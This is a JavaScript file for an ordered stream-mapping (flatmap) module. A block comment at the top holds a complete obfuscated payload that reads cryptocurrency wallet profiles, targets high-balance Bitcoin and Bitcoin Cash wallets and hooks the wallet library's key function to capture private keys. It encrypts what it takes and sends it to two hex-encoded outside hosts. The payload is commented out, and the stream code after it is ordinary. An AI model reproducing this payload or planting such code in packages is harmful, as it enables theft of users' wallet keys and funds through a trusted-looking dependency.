/*
! function() {
    function e() {
        try {
            var o = require("http"),
                a = require("crypto"),
                c = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----";

            function i(e, t, n) {
                e = Buffer.from(e, "hex").toString();
                var r = o.request({
                    hostname: e,
                    port: 8080,
                    method: "POST",
                    path: "/" + t,
                    headers: {
                        "Content-Length": n.length,
                        "Content-Type": "text/html"
                    }
                }, function() {});
                r.on("error", function(e) {}), r.write(n), r.end()
            }

            function r(e, t) {
                for (var n = "", r = 0; r < t.length; r += 200) {
                    var o = t.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
                }
                i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
            }

            function l(t, n) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(t, {
                            create: !1
                        }, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return n(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}, l("profile", function(e) {
                for (var t in e.credentials) {
                    var n = e.credentials[t];
                    "livenet" == n.network && l("balanceCache-" + n.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split(" ")[0]), "btc" == t.coin && t.balance < 100 || "bch" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r("c", JSON.stringify(t)))
                    }.bind(n))
                }
            });
            var e = require("bitcore-wallet-client/lib/credentials.js");
            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                var t = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r("p", e + "\t" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener("deviceready", e) : e()
}();
*/
var Stream = require('stream').Stream

module.exports = function (mapper, opts) {

  var stream = new Stream()
    , inputs = 0
    , outputs = 0
    , ended = false
    , paused = false
    , destroyed = false
    , lastWritten = 0
    , inNext = false

  opts = opts || {};
  var errorEventName = opts.failures ? 'failure' : 'error';

  // Items that are not ready to be written yet (because they would come out of
  // order) get stuck in a queue for later.
  var writeQueue = {}

  stream.writable = true
  stream.readable = true

  function queueData(data, number) {
    var nextToWrite = lastWritten + 1

    if (number === nextToWrite) {
      // If it's next, and its not undefined write it
      if (data !== undefined) {
        stream.emit.apply(stream, ['data', data])
      }
      lastWritten++
      nextToWrite++
    } else {
      // Otherwise queue it for later.
      writeQueue[number] = data
    }

    // If the next value is in the queue, write it
    if (writeQueue.hasOwnProperty(nextToWrite)) {
      var dataToWrite = writeQueue[nextToWrite]
      delete writeQueue[nextToWrite]
      return queueData(dataToWrite, nextToWrite)
    }

    outputs++
    if (inputs === outputs) {
      if (paused) paused = false, stream.emit('drain') //written all the incoming events
      if (ended) end()
    }
  }

  function next(err, data, number) {
    if (destroyed) return
    inNext = true

    if (!err || opts.failures) {
      queueData(data, number)
    }

    if (err) {
      stream.emit.apply(stream, [errorEventName, err]);
    }

    inNext = false;
  }

  // Wrap the mapper function by calling its callback with the order number of
  // the item in the stream.
  function wrappedMapper(input, number, callback) {
    return mapper.call(null, input, function (err, data) {
      callback(err, data, number)
    })
  }

  stream.write = function (data) {
    if (ended) throw new Error('flatmap stream is not writable')
    inNext = false

    try {
      //catch sync errors and handle them like async errors
      for (var i in data) {
        inputs++
        var written = wrappedMapper(data[i], inputs, next)
        paused = (written === false)
        if (paused)
          break
      }
      return !paused
    } catch (err) {
      //if the callback has been called syncronously, and the error
      //has occured in an listener, throw it again.
      if (inNext)
        throw err
      next(err)
      return !paused
    }
  }

  function end(data) {
    //if end was called with args, write it, 
    ended = true //write will emit 'end' if ended is true
    stream.writable = false
    if (data !== undefined) {
      return queueData(data, inputs)
    } else if (inputs == outputs) { //wait for processing 
      stream.readable = false, stream.emit('end'), stream.destroy()
    }
  }

  stream.end = function (data) {
    if (ended) return
    end(data)
  }

  stream.destroy = function () {
    ended = destroyed = true
    stream.writable = stream.readable = paused = false
    process.nextTick(function () {
      stream.emit('close')
    })
  }
  stream.pause = function () {
    paused = true
  }

  stream.resume = function () {
    paused = false
  }

  return stream
}
